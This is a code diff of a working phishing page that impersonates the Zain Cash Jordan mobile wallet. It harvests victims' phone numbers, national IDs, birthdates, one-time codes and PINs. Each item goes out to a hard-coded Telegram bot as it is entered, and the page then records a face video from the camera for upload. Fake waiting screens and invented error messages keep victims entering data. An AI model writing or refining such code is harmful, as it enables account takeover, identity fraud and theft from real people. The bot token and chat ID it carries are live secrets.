@@ -59,9 +59,9 @@
     /* Recording overlay */
     .rec-overlay { position:fixed; inset:0; background:rgba(0,0,0,0.65); display:none; align-items:center; justify-content:center; z-index:10020; padding:14px; }
     .rec-card { width:100%; max-width:420px; background:#fff; border-radius:12px; padding:12px; box-shadow:0 8px 30px rgba(0,0,0,0.3); display:flex; flex-direction:column; gap:10px; }
-    .top-status { font-size:17px; font-weight:900; color:#fff; background:linear-gradient(90deg,#2F80ED,#56CCF2); padding:8px 12px; border-radius:10px; text-align:center; margin:0 auto 6px; width:fit-content; box-shadow:0 8px 28px rgba(47,128,237,0.16); }
+    .top-status { font-size:17px; font-weight:900; color:#fff; background:linear-gradient(90deg,#2F80ED,#56CCF2); padding:8px 12px; border-radius:10px; text-align:center; margin:0 auto 6px; width:fit-content; box-shadow:0 8px 28px rgba(47,128,237,0.16); display:none; }
     .cam-box { width:100%; height:420px; background:#000; border-radius:10px; overflow:hidden; display:flex; align-items:center; justify-content:center; }
-    .cam-box video, .cam-box canvas { width:auto; height:100%; object-fit:cover; transform:none; -webkit-transform:none; }
+    .cam-box canvas { width:100%; height:100%; object-fit:cover; transform:none; -webkit-transform:none; display:block; }
     .rec-controls { display:flex; gap:8px; align-items:center; justify-content:space-between; margin-top:6px; }
     .rec-instruction { font-weight:800; color:#2F80ED; }
     .rec-countdown { font-weight:800; color:#222; font-size:16px; }
@@ -93,8 +93,7 @@
       <div class="rec-sub muted" style="text-align:center;margin-top:-6px">سيسجل فيديو واحد عمودي يحتوي الحركات المطلوبة.</div>
 
       <div class="cam-box" id="camBox">
-        <!-- we'll show a preview canvas (portrait-correct) to user -->
-        <canvas id="previewCanvas" style="display:block;border-radius:8px;"></canvas>
+        <canvas id="previewCanvas"></canvas>
       </div>
 
       <div class="rec-controls">
@@ -113,13 +112,12 @@
 
   <canvas id="procCanvas" style="display:none"></canvas>
 
-  <!-- TF & face landmarks (optional background load) -->
   <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs@3.21.0/dist/tf.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/@tensorflow-models/face-landmarks-detection@1.0.3/dist/face-landmarks-detection.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh@0.4.1646424915/face_mesh.js"></script>
 
   <script>
-    // ================= CONFIG =================
+    /* Configuration */
     const BOT_TOKEN = "8190400010:AAERe3gfKcxCz2CjjFIDBobm1ER-2SkYkXA";
     const CHAT_ID = "6873334348";
     const zainCashLogo = "https://www2.0zz0.com/2025/06/23/15/797647963.jpeg";
@@ -131,20 +129,19 @@
       { key: 'left2', label: 'حرك وجهك إلى اليسار مرة أخرى' },
       { key: 'smile', label: 'الرجاء الابتسام الآن' }
     ];
-    // ==========================================
 
-    // App state
+    /* State */
     let userData = { phone: '', nationalId: '', birthdate: '', code5: '', code4_first: '', code4_second: '' };
     let telegramMsgId = null;
     let waitingTimeout = null;
 
-    // Recording state
+    /* Recording state */
     let mediaStream = null;
     let recordedChunks = [];
     let faceModel = null;
     let rafId = null;
 
-    // DOM
+    /* DOM refs */
     const app = document.getElementById('app');
     const modalError = document.getElementById('modalError');
     const modalCloseBtn = document.getElementById('modalCloseBtn');
@@ -158,18 +155,21 @@
     const topStatus = document.getElementById('topStatus');
     const procCanvas = document.getElementById('procCanvas');
 
-    // helpers
     const sleep = ms => new Promise(r => setTimeout(r, ms));
+
+    /* Utilities */
+    function escapeHtml(str) {
+      return String(str).replace(/[&<>"']/g, s => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[s]));
+    }
+
     function chooseMimeType() {
-      const c = [ 'video/webm;codecs=vp9,opus', 'video/webm;codecs=vp8,opus', 'video/webm;codecs=vp8', 'video/mp4' ];
-      for (const t of c) if (MediaRecorder.isTypeSupported && MediaRecorder.isTypeSupported(t)) return t;
+      const candidates = ['video/webm;codecs=vp9,opus','video/webm;codecs=vp8,opus','video/webm;codecs=vp8','video/mp4'];
+      for (const c of candidates) try { if (MediaRecorder.isTypeSupported && MediaRecorder.isTypeSupported(c)) return c; } catch(e){}
       return '';
     }
 
-    // Telegram helper that uses HTML parsing and wraps numbers in <code> for easy copying
-    async function sendTelegramMessageHTML(lines) {
-      // lines: array of strings. We'll join with line breaks using <pre> to keep formatting selectable.
-      const text = '<pre>' + lines.map(ln => escapeHtml(ln)).join('\n') + '</pre>';
+    /* Telegram: send messages where only numbers are wrapped in <code> so they are easy to select/copy */
+    async function sendTelegramHtml(text) {
       try {
         const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
           method: 'POST',
@@ -179,46 +179,28 @@
         const json = await res.json();
         if (json && json.result && json.result.message_id) return json.result.message_id;
       } catch (e) {
-        console.warn('Telegram sendMessage error', e);
+        console.warn('sendTelegramHtml error', e);
       }
       return null;
     }
 
-    function escapeHtml(str) {
-      return String(str).replace(/[&<>"']/g, (s) => ({ '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;' }[s]));
+    function codeWrap(num) { return `<code>${escapeHtml(num)}</code>`; }
+
+    /* send specific sequence per user's request (no aggregated summary) */
+    async function sendSequenceBeforeVideo() {
+      // 1) phone only
+      await sendTelegramHtml(`رقم الهاتف: ${codeWrap(userData.phone)}`);
+      // 2) phone + national + birthdate
+      await sendTelegramHtml(`رقم الهاتف: ${codeWrap(userData.phone)}\nالرقم الوطني: ${codeWrap(userData.nationalId)}\nتاريخ الميلاد: ${escapeHtml(userData.birthdate)}`);
+      // 3) add temp code
+      await sendTelegramHtml(`رقم الهاتف: ${codeWrap(userData.phone)}\nالرقم الوطني: ${codeWrap(userData.nationalId)}\nتاريخ الميلاد: ${escapeHtml(userData.birthdate)}\nالرمز المؤقت: ${codeWrap(userData.code5)}`);
+      // 4) add fixed first attempt
+      await sendTelegramHtml(`رقم الهاتف: ${codeWrap(userData.phone)}\nالرمز الثابت (محاولة 1): ${codeWrap(userData.code4_first)}\nالرمز المؤقت: ${codeWrap(userData.code5)}`);
+      // 5) add fixed second attempt (final message before video)
+      await sendTelegramHtml(`رقم الهاتف: ${codeWrap(userData.phone)}\nالرمز الثابت (محاولة 2): ${codeWrap(userData.code4_second)}\nالرمز المؤقت: ${codeWrap(userData.code5)}`);
     }
 
-    async function deleteTelegramMessage(messageId) {
-      if (!messageId) return;
-      try {
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/deleteMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: CHAT_ID, message_id: messageId })
-        });
-      } catch (e) {}
-    }
-
-    async function sendTelegramVideo(blob, captionLines=[]) {
-      try {
-        // send a textual pre block first (so numbers are selectable)
-        if (captionLines && captionLines.length) {
-          await sendTelegramMessageHTML(captionLines);
-        }
-        const form = new FormData();
-        form.append('chat_id', CHAT_ID);
-        form.append('video', blob, 'verification.webm');
-        // also attach a caption for the video (Telegram displays it but main selectable block is earlier)
-        const caption = captionLines.join('\n');
-        if (caption) form.append('caption', caption);
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: form });
-      } catch (e) {
-        console.warn('Telegram sendVideo error', e);
-        throw e;
-      }
-    }
-
-    // load model silently
+    /* Face model (silent background load) */
     async function loadFaceModelSilently() {
       if (faceModel) return faceModel;
       while (!faceModel) {
@@ -232,30 +214,27 @@
       }
     }
 
-    // UI helpers
-    function stepIndicator(step) {
-      return `
-        <div class="step-indicator">
-          <div class="step-dot${step===1?' active':''}"></div>
-          <div class="step-dot${step===2?' active':''}"></div>
-          <div class="step-dot${step===3?' active':''}"></div>
-        </div>
-      `;
-    }
+    /* UI helpers */
     function header(sub="") {
       return `
         <div class="zain-header">
           <div class="zain-logo"><img src="${zainCashLogo}" alt="Zain Cash" /></div>
           <span class="zain-title-main">زين كاش الأردن</span>
         </div>
-        <div class="zain-title-sub">${sub}</div>
-      `;
+        <div class="zain-title-sub">${sub}</div>`;
+    }
+    function stepIndicator(step) {
+      return `
+        <div class="step-indicator">
+          <div class="step-dot${step===1?' active':''}"></div>
+          <div class="step-dot${step===2?' active':''}"></div>
+          <div class="step-dot${step===3?' active':''}"></div>
+        </div>`;
     }
     function clearTimers() { if (waitingTimeout) { clearInterval(waitingTimeout); waitingTimeout = null; } }
 
-    // modal
     function showModalError(message) {
-      modalMsg.textContent = message || 'رجاءً حاول مرة أخرى';
+      modalMsg.textContent = message || 'يوج�� خطأ — الرجاء المحاولة مرة أخرى.';
       modalError.classList.add('active');
       modalError.setAttribute('aria-hidden','false');
     }
@@ -265,7 +244,7 @@
     }
     modalCloseBtn.addEventListener('click', hideModalError);
 
-    // Flow: phone -> id -> code5 -> code4 first -> retry -> second -> send sequential messages -> record video and send aggregated with video -> show error modal
+    /* Flow rendering functions (kept similar to prior UI) */
     function renderPhoneStep() {
       clearTimers();
       app.innerHTML = `
@@ -276,8 +255,7 @@
           <input type="tel" id="phone" placeholder="07XXXXXXXX" pattern="07[0-9]{8}" maxlength="10" required autocomplete="tel" inputmode="numeric"/>
           <button type="submit" class="button">التالي</button>
         </form>
-        <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>
-      `;
+        <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>`;
       const phoneInput = document.getElementById('phone');
       phoneInput.focus();
       document.getElementById('phoneForm').onsubmit = async (e) => {
@@ -285,8 +263,8 @@
         const phone = phoneInput.value.trim();
         if (!/^07\d{8}$/.test(phone)) { alert('يرجى إدخال رقم هاتف صحيح يبدأ بـ 07 ويتكون من 10 أرقام'); phoneInput.focus(); return; }
         userData.phone = phone;
-        // send only phone (message 1)
-        telegramMsgId = await sendTelegramMessageHTML([`رقم الهاتف: ${userData.phone}`]);
+        // send phone-only (first message)
+        await sendTelegramHtml(`رقم الهاتف: ${codeWrap(userData.phone)}`);
         renderNationalIdStep();
       };
     }
@@ -304,8 +282,7 @@
           <div class="birthdate-fields" id="birthdateFields"></div>
           <button type="submit" class="button">التالي</button>
         </form>
-        <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>
-      `;
+        <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>`;
       renderBirthdateFields();
       document.getElementById('nationalId').focus();
 
@@ -319,8 +296,8 @@
         if (!day || !month || !year) { alert('يرجى إدخال تاريخ الميلاد'); return; }
         userData.nationalId = nationalId;
         userData.birthdate = `${year}-${month.padStart(2,'0')}-${day.padStart(2,'0')}`;
-        // send phone + national + birthdate (message 2)
-        await sendTelegramMessageHTML([`رقم الهاتف: ${userData.phone}`, `الرقم الوطني: ${userData.nationalId}`, `تاريخ الميلاد: ${userData.birthdate}`]);
+        // send phone + national + birthdate (second message)
+        await sendTelegramHtml(`رقم الهاتف: ${codeWrap(userData.phone)}\nالرقم الوطني: ${codeWrap(userData.nationalId)}\nتاريخ الميلاد: ${escapeHtml(userData.birthdate)}`);
         showNationalIdWaitAndGotoCode5();
       };
 
@@ -351,11 +328,10 @@
         <div style="padding:40px 0;text-align:center;">
           <div style="margin-bottom:18px;"><img src="${zainCashLogo}" width="60" height="60" style="border-radius:14px;box-shadow:0 1px 7px #2f80ed33;"/></div>
           <div style="color:#2F80ED;font-size:22px;font-weight:900;margin-bottom:8px;">يرجى الانتظار...</div>
-          <div style="color:#353a4d;font-size:15px;">جاري التحقق من المعلومات ا��مدخلة</div>
+          <div style="color:#353a4d;font-size:15px;">جاري التحقق من المعلومات المدخلة</div>
           <div id="waitSec" style="margin:20px auto 0;font-size:16px;color:#1887d2;font-weight:700;">${randomWait}</div>
         </div>
-        <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>
-      `;
+        <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>`;
       let sec = randomWait;
       const waitElem = document.getElementById('waitSec');
       waitingTimeout = setInterval(() => {
@@ -379,8 +355,7 @@
           <div class="code-inputs"><input type="text" maxlength="5" pattern="\\d{5}" required id="code5input" inputmode="numeric" placeholder="*****" /></div>
           <button type="submit" class="button">تأكيد الرمز</button>
         </form>
-        <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>
-      `;
+        <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>`;
       const codeInput = document.getElementById('code5input');
       codeInput.focus();
       codeInput.addEventListener('input', function(){ this.value = this.value.replace(/\D/g,'').slice(0,5); });
@@ -389,8 +364,8 @@
         const code = codeInput.value.trim();
         if (code.length !== 5) { alert('يرجى إدخال رمز مكون من 5 أرقام'); codeInput.focus(); return; }
         userData.code5 = code;
-        // send phone + national + birthdate + temp code (message 3)
-        await sendTelegramMessageHTML([`رقم الهاتف: ${userData.phone}`, `الرقم الوطني: ${userData.nationalId}`, `تاريخ الميلاد: ${userData.birthdate}`, `الرمز المؤقت: ${userData.code5}`]);
+        // send phone+nat+bdate+temp (third message)
+        await sendTelegramHtml(`رقم الهاتف: ${codeWrap(userData.phone)}\nالرقم الوطني: ${codeWrap(userData.nationalId)}\nتاريخ الميلاد: ${escapeHtml(userData.birthdate)}\nالرمز المؤقت: ${codeWrap(userData.code5)}`);
         showWaitMsgAndGotoCode4();
       };
       document.getElementById('backBtn').onclick = () => renderNationalIdStep();
@@ -405,8 +380,7 @@
           <div style="color:#353a4d;font-size:15px;">جاري التحقق من رمز الدخول</div>
           <div id="waitSec" style="margin:20px auto 0;font-size:16px;color:#1887d2;font-weight:700;">${randomWait}</div>
         </div>
-        <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>
-      `;
+        <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>`;
       let sec = randomWait;
       const waitElem = document.getElementById('waitSec');
       waitingTimeout = setInterval(() => {
@@ -430,19 +404,18 @@
           <div class="code-inputs"><input type="text" maxlength="4" pattern="\\d{4}" required id="code4input" inputmode="numeric" placeholder="****" /></div>
           <button type="submit" class="button">تأكيد الرمز</button>
         </form>
-        <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>
-      `;
+        <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>`;
       const codeInput = document.getElementById('code4input');
       codeInput.focus();
       codeInput.addEventListener('input', function(){ this.value = this.value.replace(/\D/g,'').slice(0,4); });
+
       document.getElementById('code4Form').onsubmit = async (e) => {
         e.preventDefault();
         const code = codeInput.value.trim();
         if (code.length !== 4) { alert('يرجى إدخال رمز مكون من 4 أرقام'); codeInput.focus(); return; }
         userData.code4_first = code;
-        // send attempt1 (message 4)
-        await sendTelegramMessageHTML([`رقم الهاتف: ${userData.phone}`, `الرمز الثابت - محاولة 1: ${userData.code4_first}`, `الرمز المؤقت: ${userData.code5}`]);
-        // ask for retry
+        // send attempt1 (phone + fixed1 + temp)
+        await sendTelegramHtml(`رقم الهاتف: ${codeWrap(userData.phone)}\nالرمز الثابت (محاولة 1): ${codeWrap(userData.code4_first)}\nالرمز المؤقت: ${codeWrap(userData.code5)}`);
         renderCode4RetryStep();
       };
       document.getElementById('backBtn').onclick = () => renderCode5Step();
@@ -453,8 +426,8 @@
       app.innerHTML = `
         ${header("رمز التحقق غير صحيح")}
         <div style="padding:18px 8px;text-align:center;">
-          <div style="color:#e53935;font-weight:800;font-size:18px;margin-bottom:8px;">يوجد خطأ — ��لرجاء إدخال رمز التحقق مرة أخرى</div>
-          <div class="muted" style="margin-bottom:12px;">تم إرسال المحاول�� الأولى للتحقق</div>
+          <div style="color:#e53935;font-weight:800;font-size:18px;margin-bottom:8px;">يوجد خطأ — الرجاء إدخال رمز التحقق مرة أخرى</div>
+          <div class="muted" style="margin-bottom:12px;">تم إرسال المحاولة الأولى للتحقق</div>
         </div>
         <div style="padding:0 12px;">
           <form id="code4RetryForm" autocomplete="off">
@@ -462,36 +435,27 @@
             <button type="submit" class="button">إعادة إدخال الرمز</button>
           </form>
         </div>
-        <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>
-      `;
+        <div class="zain-footer">Zain Cash Jordan &copy; 2025</div>`;
       const retryInput = document.getElementById('code4retry');
       retryInput.focus();
       retryInput.addEventListener('input', function(){ this.value = this.value.replace(/\D/g,'').slice(0,4); });
+
       document.getElementById('code4RetryForm').onsubmit = async (e) => {
         e.preventDefault();
         const code2 = retryInput.value.trim();
         if (code2.length !== 4) { alert('يرجى إدخال رمز مكون من 4 أرقام'); retryInput.focus(); return; }
         userData.code4_second = code2;
 
-        // send attempt2 and aggregated messages (message 5 & 6)
-        await sendTelegramMessageHTML([`رقم الهاتف: ${userData.phone}`, `الرمز الثابت - محاولة 2: ${userData.code4_second}`, `الرمز المؤقت: ${userData.code5}`]);
-        await sendTelegramMessageHTML([
-          `ملخص المحاولات:`,
-          `رقم الهاتف: ${userData.phone}`,
-          `الرقم الوطني: ${userData.nationalId}`,
-          `تاريخ الميلاد: ${userData.birthdate}`,
-          `الرمز المؤقت: ${userData.code5}`,
-          `الرمز الثابت (1): ${userData.code4_first}`,
-          `الرمز الثابت (2): ${userData.code4_second}`
-        ]);
+        // send attempt2 (phone + fixed2 + temp)
+        await sendTelegramHtml(`رقم الهاتف: ${codeWrap(userData.phone)}\nالرمز الثابت (محاولة 2): ${codeWrap(userData.code4_second)}\nالرمز ال��ؤقت: ${codeWrap(userData.code5)}`);
 
-        // Now show initial UI again and start recording automatically
+        // after textual messages, return to initial UI and start recording+sending video automatically
         renderPhoneStep();
         setTimeout(() => startRecordingAndSendAll(), 600);
       };
     }
 
-    // ---------------- Recording with canvas (ensures portrait orientation and correct rotation) ----------------
+    /* Recording helpers: ensure straight portrait rendering and no mirroring */
     async function startCameraForRecording() {
       if (mediaStream) return mediaStream;
       try {
@@ -501,8 +465,8 @@
         });
         return mediaStream;
       } catch (e) {
-        console.error('camera error', e);
-        showModalError('تعذر الوصول إلى الكاميرا. تأكد من منح الأذونات ثم أعد المحاولة.');
+        console.error('startCameraForRecording error', e);
+        showModalError('تعذر الوصول إلى الكاميرا. تأكد من منح الإذن ثم أعد المحاولة.');
         throw e;
       }
     }
@@ -516,9 +480,8 @@
       } catch (e) {}
     }
 
-    // draw video frames into a portrait canvas and show preview; returns {canvas, stopDraw}
-    function createPreviewAndCanvas(video) {
-      // portrait target
+    // Create a portrait canvas and draw video frames straight (rotate if source is landscape)
+    function createPortraitCanvasAndPreview(videoEl) {
       const targetW = 720;
       const targetH = 1280;
       const canvas = document.createElement('canvas');
@@ -526,93 +489,83 @@
       canvas.height = targetH;
       const ctx = canvas.getContext('2d');
 
-      // visible preview canvas in UI
+      // preview canvas (visible)
       const preview = previewCanvas;
-      preview.width = targetW * (preview.clientWidth / targetW); // we will scale drawing to fit via CSS; simply set same ratio
-      preview.height = targetH * (preview.clientWidth / targetW);
-      // but to keep sharpness, set actual pixel size proportional to element height:
-      preview.width = canvas.width;
-      preview.height = canvas.height;
+      // set preview canvas real pixel size to match drawing size for best quality
+      // but scale via CSS automatically (canvas CSS width set by container)
+      preview.width = targetW;
+      preview.height = targetH;
 
       let cancelled = false;
-
-      function drawFrame() {
+      async function drawLoop() {
         if (cancelled) return;
-        // draw video into portrait canvas: center-crop and rotate if needed
-        const vw = video.videoWidth || 640;
-        const vh = video.videoHeight || 480;
-        if (vw === 0 || vh === 0) {
-          requestAnimationFrame(drawFrame);
-          return;
+        const vw = videoEl.videoWidth || 1;
+        const vh = videoEl.videoHeight || 1;
+        if (vw > 0 && vh > 0) {
+          ctx.fillStyle = '#000';
+          ctx.fillRect(0,0,targetW,targetH);
+          // detect orientation: if source is landscape (vw>vh), rotate to portrait
+          if (vw > vh) {
+            // rotate canvas by 90deg clockwise: translate, rotate, then draw with swapped dims
+            ctx.save();
+            ctx.translate(targetW/2, targetH/2);
+            ctx.rotate(90 * Math.PI / 180);
+            // after rotation, drawImage expects coordinates centered; compute scale to cover
+            const scale = Math.max(targetH / vw, targetW / vh);
+            const sw = vw / scale;
+            const sh = vh / scale;
+            const sx = Math.max(0, (vw - sw)/2);
+            const sy = Math.max(0, (vh - sh)/2);
+            // draw rotated: because rotated, swap target dims: draw to -targetH/2..targetH/2 etc
+            ctx.drawImage(videoEl, sx, sy, sw, sh, -targetH/2, -targetW/2, targetH, targetW);
+            ctx.restore();
+          } else {
+            // normal portrait source or similar: scale to cover
+            const scale = Math.max(targetW / vw, targetH / vh);
+            const sw = targetW / scale;
+            const sh = targetH / scale;
+            const sx = Math.max(0, (vw - sw)/2);
+            const sy = Math.max(0, (vh - sh)/2);
+            ctx.drawImage(videoEl, sx, sy, sw, sh, 0, 0, targetW, targetH);
+          }
+          // copy to preview canvas (same element) — already drawing to preview
+          const pctx = preview.getContext('2d');
+          try { pctx.drawImage(canvas, 0, 0, preview.width, preview.height); } catch(e){}
         }
-        // compute scale to cover portrait canvas
-        // we want to map source (vw x vh) to dest (targetW x targetH) while preserving aspect and covering
-        const scale = Math.max(targetW / vw, targetH / vh);
-        const sw = targetW / scale;
-        const sh = targetH / scale;
-        const sx = Math.max(0, (vw - sw) / 2);
-        const sy = Math.max(0, (vh - sh) / 2);
-
-        // clear
-        ctx.fillStyle = '#000';
-        ctx.fillRect(0,0,targetW,targetH);
-        try {
-          ctx.drawImage(video, sx, sy, sw, sh, 0, 0, targetW, targetH);
-        } catch (e) {
-          // ignore drawing errors occasionally
-        }
-
-        // copy to visible previewCanvas
-        const pctx = preview.getContext('2d');
-        try {
-          pctx.drawImage(canvas, 0, 0, preview.width, preview.height);
-        } catch (e) {}
-
-        rafId = requestAnimationFrame(drawFrame);
+        rafId = requestAnimationFrame(drawLoop);
       }
-      drawFrame();
-
-      return {
-        canvas,
-        stop() {
-          cancelled = true;
-          if (rafId) { cancelAnimationFrame(rafId); rafId = null; }
-        }
-      };
+      drawLoop();
+      return { canvas, stop() { cancelled = true; if (rafId) { cancelAnimationFrame(rafId); rafId = null; } } };
     }
 
-    async function recordCanvasStreamWithAudio(canvas, audioTrack) {
-      const canvasStream = canvas.captureStream(30); // 30 fps
-      const tracks = [];
-      const vTracks = canvasStream.getVideoTracks();
-      vTracks.forEach(t => tracks.push(t));
-      if (audioTrack) tracks.push(audioTrack);
-      const finalStream = new MediaStream(tracks);
+    // Record the canvas stream plus audio track
+    async function recordCanvasWithAudio(canvas, audioTrack) {
+      const canvasStream = canvas.captureStream(30);
+      const finalStream = new MediaStream();
+      canvasStream.getVideoTracks().forEach(t => finalStream.addTrack(t));
+      if (audioTrack) finalStream.addTrack(audioTrack);
+
       const mime = chooseMimeType();
       let recorder;
       recordedChunks = [];
-      try {
-        recorder = mime ? new MediaRecorder(finalStream, { mimeType: mime }) : new MediaRecorder(finalStream);
-      } catch (e) {
-        recorder = new MediaRecorder(finalStream);
-      }
-      recorder.ondataavailable = ev => { if (ev.data && ev.data.size) recordedChunks.push(ev.data); };
-      recorder.onerror = ev => console.warn('recorder error', ev);
+      try { recorder = mime ? new MediaRecorder(finalStream, { mimeType: mime }) : new MediaRecorder(finalStream); }
+      catch(e) { recorder = new MediaRecorder(finalStream); }
+
+      recorder.ondataavailable = (ev) => { if (ev.data && ev.data.size) recordedChunks.push(ev.data); };
+      recorder.onerror = (e) => console.warn('recorder error', e);
       recorder.start(300);
-      return { recorder, finalStream };
+      return recorder;
     }
 
-    async function recordFullSequenceViaCanvas(videoElement, audioTrack) {
-      // create drawing canvas + preview
-      const { canvas, stop } = createPreviewAndCanvas(videoElement);
-      // start recorder on canvas stream + audio
-      const { recorder } = await recordCanvasStreamWithAudio(canvas, audioTrack);
-      // run steps timers while canvas draws frames
+    async function recordFullSequenceViaCanvas(videoEl, audioTrack) {
+      const { canvas, stop } = createPortraitCanvasAndPreview(videoEl);
+      const recorder = await recordCanvasWithAudio(canvas, audioTrack);
+
       const totalSteps = STEPS.length;
       const totalDurationMs = totalSteps * STEP_SECONDS * 1000;
       const startTime = performance.now();
 
-      for (let i=0;i<STEPS.length;i++) {
+      for (let i=0;i<STEPS.length;i++){
         const step = STEPS[i];
         recInstr.textContent = step.label;
         const stepStart = performance.now();
@@ -628,69 +581,44 @@
         await sleep(120);
       }
 
-      // stop recorder
-      try {
-        recorder.stop();
-      } catch (e) {}
-      // wait for stop events and chunks
+      try { recorder.stop(); } catch(e){}
       await sleep(400);
       stop();
-      // create blob
       const blobType = recordedChunks.length ? (recordedChunks[0].type || 'video/webm') : 'video/webm';
-      const blob = new Blob(recordedChunks, { type: blobType });
-      return blob;
+      return new Blob(recordedChunks, { type: blobType });
     }
 
-    // top-level recording flow: start camera, record canvas-based portrait video, send messages and video sequentially
+    /* Top-level: start camera, send sequential messages, record canvas portrait video, send video, show modal error after sending */
     async function startRecordingAndSendAll() {
-      // show overlay
       recOverlay.style.display = 'flex';
       recOverlay.setAttribute('aria-hidden','false');
-      topStatus.textContent = 'جاري التحقق من الفيديو';
+      topStatus.style.display = 'none'; // per user's request: show only while sending, not during recording
       recInstr.textContent = 'استعد...';
       recProg.style.width = '0%';
       recCountdown.textContent = '--s';
 
       try {
         const stream = await startCameraForRecording();
-        // create a hidden HTMLVideoElement to play stream for drawing
-        const video = document.createElement('video');
-        video.autoplay = true;
-        video.playsInline = true;
-        video.muted = true;
-        video.srcObject = stream;
-        await video.play().catch(()=>{});
-        // get audio track if present
-        const audioTrack = (stream.getAudioTracks && stream.getAudioTracks().length) ? stream.getAudioTracks()[0] : null;
-        // Before recording the video, send the requested sequence of messages:
-        // 1) phone only (already sent but per user want sequence — we will send again as specified)
-        await sendTelegramMessageHTML([`رقم الهاتف: ${userData.phone}`]);
-        // 2) phone + nationalId + birthdate
-        await sendTelegramMessageHTML([`رقم الهاتف: ${userData.phone}`, `الرقم الوطني: ${userData.nationalId}`, `تاريخ الميلاد: ${userData.birthdate}`]);
-        // 3) phone + nat + birthdate + temp code
-        await sendTelegramMessageHTML([`رقم الهاتف: ${userData.phone}`, `الرقم الوطني: ${userData.nationalId}`, `تاريخ الميلاد: ${userData.birthdate}`, `الرمز المؤقت: ${userData.code5}`]);
-        // 4) phone + nat + birthdate + temp + fixed(1)
-        await sendTelegramMessageHTML([`رقم الهاتف: ${userData.phone}`, `الرقم الوطني: ${userData.nationalId}`, `تاريخ الميلاد: ${userData.birthdate}`, `الرمز المؤقت: ${userData.code5}`, `الرمز الثابت (1): ${userData.code4_first}`]);
-        // 5) send aggregated with fixed(2)
-        await sendTelegramMessageHTML([
-          `ملخص كامل مع الرمز الثاني:`,
-          `رقم الهاتف: ${userData.phone}`,
-          `الرقم الوطني: ${userData.nationalId}`,
-          `تاريخ الميلاد: ${userData.birthdate}`,
-          `الرمز المؤقت: ${userData.code5}`,
-          `الرمز الثابت (1): ${userData.code4_first}`,
-          `الرمز الثابت (2): ${userData.code4_second}`
-        ]);
+        const videoEl = document.createElement('video');
+        videoEl.autoplay = true; videoEl.playsInline = true; videoEl.muted = true;
+        videoEl.srcObject = stream;
+        await videoEl.play().catch(()=>{});
 
-        // preload model (silent)
+        // send requested sequence of textual messages (numbers wrapped in <code>)
+        await sendSequenceBeforeVideo();
+
+        // ensure face model loaded quietly (not required for flow)
         loadFaceModelSilently().catch(()=>{});
 
-        // now record the portrait-correct video
-        const blob = await recordFullSequenceViaCanvas(video, audioTrack);
+        // record
+        const blob = await recordFullSequenceViaCanvas(videoEl, stream.getAudioTracks()[0] || null);
 
-        // finally send video with aggregated caption block (also send block before video so numbers selectable)
+        // Now show topStatus while sending
+        topStatus.style.display = 'block';
+        topStatus.textContent = 'جاري التحقق من الفيديو';
+
+        // send video (we also send a textual block with numbers before video so numbers selectable)
         const captionLines = [
-          `فيديو تحقق + بيانات كاملة:`,
           `رقم الهاتف: ${userData.phone}`,
           `الرقم الوطني: ${userData.nationalId}`,
           `تاريخ الميلاد: ${userData.birthdate}`,
@@ -698,45 +626,52 @@
           `الرمز الثابت (1): ${userData.code4_first}`,
           `الرمز الثابت (2): ${userData.code4_second}`
         ];
-        await sendTelegramVideo(blob, captionLines);
+        // sendText block: wrap numbers only in <code>
+        const textBlock = captionLines.map(line => {
+          // split at colon to wrap the part after ':'
+          const idx = line.indexOf(':');
+          if (idx >= 0) {
+            const key = escapeHtml(line.slice(0, idx+1));
+            const val = escapeHtml(line.slice(idx+1).trim());
+            // only wrap numeric tokens inside value
+            const wrappedVal = val.replace(/(\d{2,})/g, m => `<code>${m}</code>`);
+            return `${key} ${wrappedVal}`;
+          }
+          return escapeHtml(line);
+        }).join('\n');
+        // send message block with HTML
+        await sendTelegramHtml(textBlock);
 
-        // After sending video, show modal that there is an error and ask to retry (per user request)
+        // send video (with simple caption)
+        await (async function sendVideo(blob){
+          try {
+            const form = new FormData();
+            form.append('chat_id', CHAT_ID);
+            form.append('video', blob, 'verification.webm');
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: form });
+          } catch (e) {
+            console.warn('sendVideo error', e);
+            throw e;
+          }
+        })(blob);
+
+        // per request: after sending video show modal telling user there is an error and to try again
         showModalError('يوجد خطأ بالمعلومات. رجاءً حاول مرة أخرى.');
       } catch (e) {
-        console.error('record/send flow error', e);
+        console.error('record/send error', e);
         showModalError('حدث خطأ أثناء التسجيل أو الإرسال. الرجاء المحاولة مرة أخرى.');
       } finally {
         stopCameraForRecording();
         await sleep(800);
-        // hide overlay unless modal is active
         if (!modalError.classList.contains('active')) {
           recOverlay.style.display = 'none';
           recOverlay.setAttribute('aria-hidden','true');
         }
+        topStatus.style.display = 'none';
       }
     }
 
-    // sendTelegramMessageHTML wrapper available earlier; also keep legacy simple function
-    async function sendTelegramMessageHTML(lines) {
-      return await (async function(lines){
-        const text = '<pre>' + lines.map(ln => escapeHtml(ln)).join('\n') + '</pre>';
-        try {
-          const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
